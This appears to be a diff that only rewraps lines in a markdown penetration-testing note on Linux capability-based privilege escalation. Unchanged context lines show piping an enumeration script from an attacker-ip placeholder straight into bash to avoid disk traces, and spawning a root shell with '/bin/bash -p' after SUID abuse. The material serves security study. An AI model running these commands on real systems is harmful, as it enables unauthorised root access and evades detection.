@@ -9,9 +9,7 @@ updated: 2026-04-16
 
 _Source: Juggernaut Pentesting Academy (Oct 2022). Educational pentest context._
 
-Capabilities can be a privilege escalation vector when set too permissively on
-binaries — particularly scripting languages, text editors, or compression
-tools.
+Capabilities can be a privilege escalation vector when set too permissively on binaries — particularly scripting languages, text editors, or compression tools.
 
 ## Mental model for attackers
 
@@ -44,14 +42,11 @@ Also enumerate with **LinPEAS** (download into memory to avoid disk trace):
 curl <attacker-ip>/linpeas.sh | bash
 ```
 
-> **Note:** Non-standard binary locations are common — capabilities are often
-> set on copies of binaries in custom paths. Always use the full absolute path,
-> not the PATH-resolved one.
+> **Note:** Non-standard binary locations are common — capabilities are often set on copies of binaries in custom paths. Always use the full absolute path, not the PATH-resolved one.
 
 ## GTFOBins strategy
 
-The GTFOBins "Capabilities" function focuses on `cap_setuid`. For other
-capabilities, match the **capability action** to the right GTFOBins function:
+The GTFOBins "Capabilities" function focuses on `cap_setuid`. For other capabilities, match the **capability action** to the right GTFOBins function:
 
 | Capability            | Relevant GTFOBins function |
 | --------------------- | -------------------------- |
@@ -118,8 +113,7 @@ Most dangerous — can set SUID bit on any binary.
 /bin/bash -p   # root shell
 ```
 
-> Best practice: copy binary to `/tmp` first, SUID the copy, avoid altering
-> system binaries.
+> Best practice: copy binary to `/tmp` first, SUID the copy, avoid altering system binaries.
 
 ## cap_setuid — execute as UID 0
 
